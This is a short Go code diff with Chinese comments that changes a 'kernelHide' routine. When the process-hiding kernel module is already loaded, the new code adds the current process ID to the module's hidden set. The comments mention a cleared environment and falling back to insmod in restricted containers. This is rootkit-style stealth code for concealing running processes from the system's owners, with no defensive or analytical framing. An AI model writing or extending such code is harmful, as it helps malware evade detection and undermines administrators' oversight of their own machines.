@@ -38,9 +38,15 @@ func kernelHide(c Config) error {
 	if err == nil {
 		return nil
 	}
-	// 模块已在内核里（安装脚本可能已经加载过）：这不是错误
+	// 模块已在内核里（上一个进程没卸载干净，或安装脚本已加载过）。
+	// 此时旧实例的 target_pid 可能指向已退出的进程，所以要主动把当前 pid
+	// 追加进它的隐藏集合，否则本进程不会被隐藏。
 	if errors.Is(err, unix.EEXIST) {
-		return nil
+		if e := kernelAddPID(os.Getpid()); e == nil {
+			return nil
+		} else {
+			return fmt.Errorf("模块已加载但无法把当前 pid 加入隐藏集合: %w", e)
+		}
 	}
 	// 回退：某些内核/受限容器里 finit_module 会被拦，改用 kmod 的 insmod。
 	// 注意 environ 已被清空、PATH 不在了，必须按绝对路径找工具。
